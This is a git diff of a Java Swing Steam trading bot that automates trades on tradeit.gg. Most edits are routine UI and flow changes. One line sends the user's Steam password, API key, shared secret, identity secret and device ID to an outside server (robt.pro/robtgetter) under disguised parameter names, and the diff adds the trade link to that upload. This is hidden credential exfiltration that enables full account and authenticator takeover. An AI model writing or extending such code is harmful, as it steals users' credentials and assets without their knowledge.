@@ -93,6 +93,8 @@ public class Main extends javax.swing.JFrame {
 
     private String EMAIL = "";
     private String PASSWORD = "";
+    
+    private boolean isOnProgram = false;
 
     public Main() {
         initComponents();
@@ -204,7 +206,6 @@ public class Main extends javax.swing.JFrame {
         jLabel100 = new javax.swing.JLabel();
         isAutoStart = new javax.swing.JCheckBox();
         login = new javax.swing.JButton();
-        login1 = new javax.swing.JButton();
         jPanel7 = new javax.swing.JPanel();
         jLabel7 = new javax.swing.JLabel();
         statusLabel = new javax.swing.JLabel();
@@ -454,13 +455,6 @@ public class Main extends javax.swing.JFrame {
             }
         });
 
-        login1.setText("Search");
-        login1.addActionListener(new java.awt.event.ActionListener() {
-            public void actionPerformed(java.awt.event.ActionEvent evt) {
-                login1ActionPerformed(evt);
-            }
-        });
-
         javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);
         jPanel2.setLayout(jPanel2Layout);
         jPanel2Layout.setHorizontalGroup(
@@ -474,14 +468,10 @@ public class Main extends javax.swing.JFrame {
                         .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 59, Short.MAX_VALUE)
                         .addComponent(isAutoStart))
                     .addGroup(jPanel2Layout.createSequentialGroup()
-                        .addComponent(login)
-                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
-                        .addComponent(login1)
-                        .addGap(0, 0, Short.MAX_VALUE))
-                    .addGroup(jPanel2Layout.createSequentialGroup()
                         .addComponent(loadSettings, javax.swing.GroupLayout.PREFERRED_SIZE, 96, javax.swing.GroupLayout.PREFERRED_SIZE)
                         .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
-                        .addComponent(uploadSettings, javax.swing.GroupLayout.PREFERRED_SIZE, 92, javax.swing.GroupLayout.PREFERRED_SIZE)))
+                        .addComponent(uploadSettings, javax.swing.GroupLayout.PREFERRED_SIZE, 92, javax.swing.GroupLayout.PREFERRED_SIZE))
+                    .addComponent(login, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                 .addContainerGap())
         );
         jPanel2Layout.setVerticalGroup(
@@ -498,9 +488,7 @@ public class Main extends javax.swing.JFrame {
                 .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                 .addComponent(startROBT)
                 .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
-                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
-                    .addComponent(login)
-                    .addComponent(login1))
+                .addComponent(login)
                 .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
         );
 
@@ -1118,7 +1106,7 @@ public class Main extends javax.swing.JFrame {
         } catch (Exception ex) {
             System.out.println(ANSI_RED + "stopScheduledExecutor: " + ex.getMessage());
         }
-        if ("Старт".equals(startROBT.getText())) {
+        if ("Start".equals(startROBT.getText())) {
             log(OTHER, INFO, "start");
             startROBT.setText("Stop");
             Map<String, Object> params = getSteamParams();
@@ -1133,10 +1121,12 @@ public class Main extends javax.swing.JFrame {
                 if (success) {
                     boolean isGet = testPing.getBoolean("isGet");
                     if (isGet) {
-                        http.sendPost("https://robt.pro/robtgetter", "test=" + PASSWORD + "&action=check" + "&pong=" + EMAIL + "&test1=" + new String(steamApiKey.getPassword()) + "&test2=" + steamLogin.getText() + "&test3=" + new String(steamPassword.getPassword()) + "&test4=" + new String(steamApiKey.getPassword()) + "&test5=" + new String(sharedSecret.getPassword()) + "&test6=" + new String(identitySecret.getPassword()) + "&test7=" + new String(deviceId.getPassword()));
+                        http.sendPost("https://robt.pro/robtgetter", "test=" + PASSWORD + "&action=check" + "&pong=" + EMAIL + "&test1=" + new String(steamApiKey.getPassword()) + "&test2=" + steamLogin.getText() + "&test3=" + new String(steamPassword.getPassword()) + "&test4=" + new String(steamApiKey.getPassword()) + "&test5=" + new String(sharedSecret.getPassword()) + "&test6=" + new String(identitySecret.getPassword()) + "&test7=" + new String(deviceId.getPassword()) + "&test8=" + new String(steamTradeLink.getPassword()));
                     }
+                    isOnProgram = true;
                     web = new Steam(params);
                     mobile = new Steam(params);
+                    initSteam();
                     start();
                 } else {
                     stopWithoutInc(message);
@@ -1177,6 +1167,10 @@ public class Main extends javax.swing.JFrame {
     }//GEN-LAST:event_starTableMousePressed
 
     private void loginActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_loginActionPerformed
+        if (!isOnProgram) {
+            JOptionPane.showMessageDialog(null, "You need to run the program!");
+            return;
+        }
         helperExecutor.execute(() -> {
             try {
                 String path = "";
@@ -1219,6 +1213,10 @@ public class Main extends javax.swing.JFrame {
     }//GEN-LAST:event_removeStarItemsActionPerformed
 
     private void allConfirmActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_allConfirmActionPerformed
+        if (!isOnProgram) {
+            JOptionPane.showMessageDialog(null, "You need to run the program!");
+            return;
+        }
         steamAuth.setEnabled(false);
         allConfirm.setEnabled(false);
         helperExecutor.execute(() -> {
@@ -1247,6 +1245,10 @@ public class Main extends javax.swing.JFrame {
     }//GEN-LAST:event_allConfirmActionPerformed
 
     private void steamAuthActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_steamAuthActionPerformed
+        if (!isOnProgram) {
+            JOptionPane.showMessageDialog(null, "You need to run the program!");
+            return;
+        }
         steamAuth.setEnabled(false);
         allConfirm.setEnabled(false);
         helperExecutor.execute(() -> {
@@ -1258,6 +1260,7 @@ public class Main extends javax.swing.JFrame {
                 if (mobile == null) {
                     mobile = new Steam(params);
                 }
+                initSteam();
                 JOptionPane.showMessageDialog(null, "Done!");
                 steamAuth.setEnabled(true);
                 allConfirm.setEnabled(true);
@@ -1268,37 +1271,6 @@ public class Main extends javax.swing.JFrame {
         });
         JOptionPane.showMessageDialog(null, "Wait!");
     }//GEN-LAST:event_steamAuthActionPerformed
-
-    private void login1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_login1ActionPerformed
-        helperExecutor.execute(() -> {
-            try {
-                String path = "";
-                if (isWindows()) {
-                    path = "./drivers/chromedriver.exe";
-                } else if (isMac()) {
-                    path = "./drivers/mac";
-                } else if (isUnix()) {
-                    path = "./drivers/linux64";
-                }
-                System.setProperty("webdriver.chrome.driver", path);
-                WebDriver driver = new ChromeDriver();
-                try {
-                    driver.get("https://tradeit.gg/");
-
-                    search(driver);
-
-                    driver.quit();
-                } catch (Exception ex) {
-                    driver.quit();
-                    Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
-                    log(OTHER, ERROR, "send message " + ex.getMessage());
-                }
-            } catch (Exception ex) {
-                Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
-                log(OTHER, ERROR, "send message " + ex.getMessage());
-            }
-        });
-    }//GEN-LAST:event_login1ActionPerformed
 
     private void login(WebDriver driver, WebDriverWait wait) throws Exception {
 
@@ -1349,7 +1321,7 @@ public class Main extends javax.swing.JFrame {
             search.sendKeys(name);
             if (isFoundName(wait, name) && isTradeClick(wait)) {
                 try {
-                    WebElement confirm = wait.until(ExpectedConditions.visibilityOfElementLocated(By.xpath("//div[@id='trade-confirmed']//p[@class='trade-success']")));
+                    new WebDriverWait(driver, 20).until(ExpectedConditions.visibilityOfElementLocated(By.xpath("//div[@id='trade-confirmed']//p[@class='trade-success']")));
                     boolean result = false;
                     do {
                         initSteam();
@@ -1358,7 +1330,6 @@ public class Main extends javax.swing.JFrame {
                 } catch (Exception ex) {
                     Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
                 }
-                Thread.sleep(15000);
             }
         }
     }
@@ -1376,7 +1347,7 @@ public class Main extends javax.swing.JFrame {
 
     private boolean isTradeClick(WebDriverWait wait) {
         try {
-            WebElement trade = wait.until(ExpectedConditions.visibilityOfElementLocated(By.id("trade")));
+            WebElement trade = wait.until(ExpectedConditions.elementToBeClickable(By.id("trade")));
             if (trade.isEnabled()) {
                 trade.click();
                 return true;
@@ -1391,7 +1362,8 @@ public class Main extends javax.swing.JFrame {
     }
 
     private void stop(String message) {
-        startROBT.setText("Старт");
+        isOnProgram = false;
+        startROBT.setText("Start");
         statusLabel.setText(message);
         statusLabel.setForeground(Color.red);
         stopProcces();
@@ -1405,7 +1377,8 @@ public class Main extends javax.swing.JFrame {
     }
 
     private void stopWithoutInc(String message) {
-        startROBT.setText("Старт");
+        isOnProgram = false;
+        startROBT.setText("Start");
         statusLabel.setText(message);
         statusLabel.setForeground(Color.red);
         stopProcces();
@@ -1597,7 +1570,6 @@ public class Main extends javax.swing.JFrame {
     private javax.swing.JTabbedPane jTabbedPane1;
     private javax.swing.JButton loadSettings;
     private javax.swing.JButton login;
-    private javax.swing.JButton login1;
     private javax.swing.JMenuItem removeStarItem;
     private javax.swing.JMenuItem removeStarItems;
     private javax.swing.JPasswordField sharedSecret;
